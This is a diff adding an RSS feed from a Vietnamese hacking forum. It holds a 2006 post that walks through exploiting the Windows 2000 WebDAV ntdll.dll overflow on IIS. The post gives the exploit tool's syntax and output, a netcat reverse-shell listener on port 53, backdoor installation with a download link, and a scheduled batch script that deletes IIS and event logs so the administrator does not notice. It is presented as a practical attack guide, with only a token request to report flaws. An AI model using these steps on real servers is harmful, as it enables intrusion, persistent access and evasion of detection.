@@ -1,0 +1,119 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<rss version="2.0">
+	<channel>
+		<title><![CDATA[Latest posts for the topic "Kỹ thuật khai thác WebDAV "]]></title>
+		<link>http://www.hvaonline.net/hvaonline/posts/list/12.hva</link>
+		<description><![CDATA[Latest messages posted in the topic "Kỹ thuật khai thác WebDAV "]]></description>
+		<generator>JForum - http://www.jforum.net</generator>
+			<item>
+				<title>Kỹ thuật khai thác WebDAV </title>
+				<description><![CDATA[ <b>Tác giả: Seamoun - HVAonline</b>
+
+<b>1) Mô tả</b>
+
+Giao thức World Wide Web Distributed Authoring and Versioning (WebDAV) là một tập hợp các mở rộng cho giao thức HTTP dùng để cung cấp một cách thức chuẩn cho việc biên tập và quản lý file giữa các máy tính trên Internet. Lỗi tràn bộ đệm đã được phát hiện trong một thành phần của Windows 2000 được sử dụng bởi WebDAV có thể cho phép kẻ tấn công chiếm quyền điều khiển máy tính
+
+<b>2) Khai thác</b>
+
+Bạn sử dụng chương trình sau webdav của kralor có thể download lại địa chỉ www.coromputer.net
+Công việc chuẩn bị là download cái webdav đó về và đặt nc(NETCAT) ở chế độ lắng nghe ở máy tính dùng để tấn công.
+Ví dụ 
+
+<blockquote>C:\>nx -vv -l -p 53
+listening on [any] 53 ...&nbsp;
+		</blockquote>
+ 
+
+Mục đích là listen ở cổng 53 là tưởng lửa không chặn cổng này
+Cú pháp webdav <IP của máy chủ IIS> <IP của máy tính dùng để tấn công> <cổng lắng nghe> [padding=1,2,3...]
+Ví dụ
+
+<blockquote>C:\> webdav xxx.xxx.xxx.xxx 203.162.118.56 53 1
+[Crpt] ntdll.dll exploit trough WebDAV by kralor [Crpt]
+www.coromputer.net && undernet #coromputer
+
+Checking WebDav on 'xxx.xxx.xxx.xxx' ... FOUND
+exploiting ntdll.dll through WebDav [ret: 0x00100010]
+Connecting... CONNECTED
+Sending evil request... SENT
+Now if you are lucky you will get a shell.&nbsp;
+		</blockquote> 
+
+Nếu như may mắn bạn có thể có shell của máy chủ IIS
+Công đoạn khai thác khi đã có shell
+Nếu như ở máy tính dùng để tấn công hiện ra kết quả như sau thì bạn đã có shell rồi đó
+
+<blockquote>C:\>nc -vv -l -p 53
+listening on [any] 53 ...
+connect to [203.162.118.56] from xxx.xxx.xxx.xxx[xxx.xxx.xxx.xxx] 1125
+Microsoft Windows 2000 [Version 5.00.2195]
+(C) Copyright 1985-2000 Microsoft Corp.&nbsp;
+		</blockquote>
+C:\WINNT\system32>   <-- OK đã thành công rùi. Hà hà đã quá !!!
+ 
+
+
+Công đoạn tiếp theo là phải xoá dấu vết của mình. Để thuận tiện cho việc khai thác server các bạn nên up một số đồ nghề thông dụng để quá trình khai thác được dễ dàng hơn khi đã có shell. Mình thường dùng ps, reg, kill, rar, wg, ce ...
+Để thuận tiện cho lần sau viếng thăm server các bạn có thể đặt vài con backdoor. Ví dụ như WinShell, Hack Defensed
+Hoặc dùng backdoor của VICKI (VKDT) các you có thể download tại đây<span class="link"> http://vicki.host.sk/tyt.zip</span>
+
++ Tìm thư mục ghi nhật ký của máy chủ IIS
+Thực hiện truy vấn sau:
+
+<blockquote>C:\WINNT\system32>reg query HKLM\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters /v LogFileDirectory
+! REG.EXE VERSION 2.0 
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W3SVC\Parameters
+LogFileDirectory REG_SZ C:\WINNT\System32\LogFiles
+Thường thì file log lưu ở thu mục C:\WINNT\System32\LogFiles
+ &nbsp;
+		</blockquote>
+C:\WINNT\system32>at
+The service has not been started. ' dịch vụ hẹn lịch đã bị admin vô hiệu
+
+C:\WINNT\system32>net start schedule ' khởi động dịch vụ hẹn lịch
+net start schedule
+The Task Scheduler service is starting.
+The Task Scheduler service was started successfully.
+
+Thực hiện một kịch bản trên server bằng cách lưu tiến trình thực hiện vào một file .bat
+Công việc của mình gồm có:
+- Dừng máy chủ IIS
+- Xoá nhật kí của IIS
+- Khởi động lại IIS
+- Xoá nhật ký của Event Log
+- Xoá file sm.bat(file viết kịch bản khai thác. Hì hì)
+Mọi công việc thực hiện bằng các lệnh như sau
+<blockquote>C:\WINNT\system32>echo iisreset /stop >sm.bat ' dừng IIS
+C:\WINNT\system32>echo rd /q /s C:\WINNT\System32\LogFiles >>sm.bat ' xóa nhật kí của IIS
+C:\WINNT\system32>echo iisreset /start >>sm.bat ' khởi động lại IIS
+C:\WINNT\system32>echo ce >>sm.bat ' xóa nhật kí của Event Log
+C:\WINNT\system32>echo del sm.bat >>sm.bat ' xóa file sm.bat
+
+C:\WINNT\system32>net time \\xxx.xxx.xxx.xxx ' lấy thời gian hiện tại của máy chủ
+Current time at \\xxx.xxx.xxx.xxx is 3/25/2003 3:00 PM
+
+The command completed successfully.
+
+C:\WINNT\system32>at 15:05 sm.bat ' đặt lịch sau 5 phút nữa sẽ làm việc
+at 15:05 sm.bat
+Added a new job with job ID = 1
+
+C:\WINNT\system32>exit ' đóng kết nối
+sent 207, rcvd 746&nbsp;
+		</blockquote>
+
+Như vậy mọi hành động của bạn thực hiện trên máy chủ IIS sẽ không bị ADMIN phát hiện. Hì hì. Nếu như các bạn để máy chủ tình trạng ngưng hoạt động chờ sự khởi động của ADMIN có thể dẫn đến ADMIN nghi ngờ có sự xâm nhập từ bên ngoài. Do vậy mình khuyên các bạn viết kịch bản khai thác như trên. Bạn nào nghĩ ra kịch bản hay hơn thì có thể gửi lên để mọi người cùng thảo luận !
+<b>
+Bản sửa lỗi này tại </b><span class="link"> http://microsoft.com/downloads/details.asp...&displaylang=en</span>
+Chúc các bạn thành công !!! (Server Việt Nam patch hơi bị nhiều đấy các bạn chắc hổng khai thác được đâu mà nếu có khai thác được cái nào thì nên báo cho ADMIN biết về lỗi này. Các bạn đừng có quậy à nha !)
+
+<i>Tác giả: Seamoun - HVAonline</i>
+
+]]></description>
+				<guid isPermaLink="true">http://www.hvaonline.net/hvaonline/posts/list/1104.hva#4646</guid>
+				<link>http://www.hvaonline.net/hvaonline/posts/list/1104.hva#4646</link>
+				<pubDate><![CDATA[Thu, 6 Jul 2006 17:11:38]]> GMT</pubDate>
+				<author><![CDATA[ phuchn71]]></author>
+			</item>
+	</channel>
+</rss>
